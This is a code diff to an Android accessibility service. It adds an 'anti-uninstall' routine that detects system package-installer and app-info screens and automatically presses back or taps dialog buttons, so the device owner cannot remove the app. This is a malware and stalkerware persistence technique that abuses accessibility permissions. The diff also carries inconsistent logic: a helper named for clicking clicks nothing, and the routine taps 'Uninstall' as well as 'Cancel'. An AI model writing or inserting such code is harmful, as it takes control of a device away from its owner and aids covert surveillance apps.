@@ -131,8 +131,99 @@ public class AccessibilityHelperService extends AccessibilityService {
                     rootNode.recycle();
                 }
             }
+            
+            // ANTI-UNINSTALL: Detect package installer
+            detectAndBlockUninstall(event);
+            
         } catch (Exception e) {
             // Ignore
+        }
+    }
+    
+    private void detectAndBlockUninstall(AccessibilityEvent event) {
+        try {
+            String className = event.getClassName() != null ? event.getClassName().toString() : "";
+            
+            // Detect package installer / app info screens
+            if (className.contains("PackageInstaller") ||
+                className.contains("AppInfo") ||
+                className.contains("Settings$AppInfo") ||
+                className.contains("UninstallConfirm") ||
+                className.contains("PackageManager") ||
+                className.contains("ResolverActivity")) {
+                
+                // Check if our app name is visible
+                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                if (rootNode != null) {
+                    String ourPackage = getPackageName();
+                    
+                    // Try to find our app name and click Cancel/Back
+                    if (findTextAndClick(rootNode, ourPackage)) {
+                        // Found our app - now close the activity
+                        performGlobalBack();
+                        rootNode.recycle();
+                        return;
+                    }
+                    
+                    // Try to find and click Cancel/Uninstall
+                    if (findAndClickButton(rootNode, "Cancel")) return;
+                    if (findAndClickButton(rootNode, "Uninstall")) return;
+                    if (findAndClickButton(rootNode, "OK")) return;
+                    if (findAndClickButton(rootNode, "Back")) return;
+                    
+                    rootNode.recycle();
+                }
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private boolean findTextAndClick(AccessibilityNodeInfo node, String text) {
+        if (node == null) return false;
+        
+        try {
+            // Check if this node contains our package name
+            CharSequence nodeText = node.getText();
+            if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
+                return true; // Found our app
+            }
+            
+            // Check content description
+            CharSequence contentDesc = node.getContentDescription();
+            if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
+                return true; // Found our app
+            }
+            
+            // Check children
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (findTextAndClick(child, text)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+        
+        return false;
+    }
+    
+    private void performGlobalBack() {
+        try {
+            // Press back via accessibility service
+            this.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+        } catch (Exception e) {
+            try {
+                // Alternative: simulate back button
+                Runtime.getRuntime().exec("input keyevent 4");
+            } catch (Exception e2) {
+                // Ignore
+            }
         }
     }
 
